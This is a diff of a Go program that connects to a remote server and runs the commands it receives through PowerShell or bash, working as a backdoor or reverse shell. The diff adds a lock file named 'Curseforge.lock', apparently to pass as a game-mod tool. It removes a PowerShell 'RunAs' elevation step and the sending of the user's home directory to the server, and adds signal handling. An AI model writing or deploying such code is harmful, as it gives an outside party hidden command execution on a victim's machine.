@@ -5,9 +5,13 @@ import (
 	"fmt"
 	"net"
 	"os"
-	"strings"
-	"runtime"
 	"os/exec"
+	"os/signal"
+	"runtime"
+	"strings"
+	"syscall"
+
+	"github.com/gofrs/flock"
 )
 
 //globals
@@ -59,13 +63,14 @@ func initListener(serveraddr string) {
 	handleErr(err)
 
 	if(debug) { fmt.Println("Listener now from: ", conn.LocalAddr().String()) }
-	listen()	
+	listen()
 }
 
 func listen() {
 	userdir, err := os.UserHomeDir()
 	handleErr(err)
-	conn.Write([]byte(userdir))
+	if(debug) {fmt.Println(userdir)} //to appease the golang gods
+	// conn.Write([]byte(userdir))
 	scan()
 }
 
@@ -98,9 +103,9 @@ func RunLogged(cmd string) {
 		if(strings.Contains(cmd, "cd")) {
 			currentDir = cmd[3:]
 			if(debug) { fmt.Println("currentdir: " + currentDir) }
-			out = exec.Command("powershell.exe","-NoProfile", "-NonInteractive", "-Command", "Start-Process powershell -Verb RunAs && " + cmd)
+			out = exec.Command("powershell.exe","-NoProfile", "-NonInteractive", "-Command", cmd)
 		} else {
-			out = exec.Command("powershell.exe","cd " + currentDir + "; " + cmd)
+			out = exec.Command("powershell.exe","-NoProfile", "-NonInteractive", "-Command", "cd " + currentDir + "; " + cmd)
 		}
 	} else {
 		out = exec.Command("bash", "-c", cmd)
@@ -116,6 +121,24 @@ func RunLogged(cmd string) {
  
 func main() {
 
+	//check if we have another thing open / lock file is already there
+	lockfile:= flock.New("Curseforge.lock")
+
+	locked, err := lockfile.TryLock()
+	if(err != nil || !locked) {
+		fmt.Println(err.Error())
+		fmt.Println(locked)
+		os.Exit(1)
+	}
+
+	sigs := make(chan os.Signal, 1)
+    signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)
+
+	defer func() {
+		lockfile.Unlock()
+		os.Remove("Curseforge.lock")
+	}()
+
 	if (len(os.Args) == 1) {
 		serverIP = "127.0.0.1:55565"
 	} else {
@@ -124,6 +147,12 @@ func main() {
 
 	if (debug) { fmt.Println("Initializing Client...") } 
 	detectOs()
-	initListener(serverIP)
 	
+	go initListener(serverIP)
+
+	<-sigs 
+	lockfile.Unlock()
+	os.Remove("Curseforge.lock")
+
+
  }
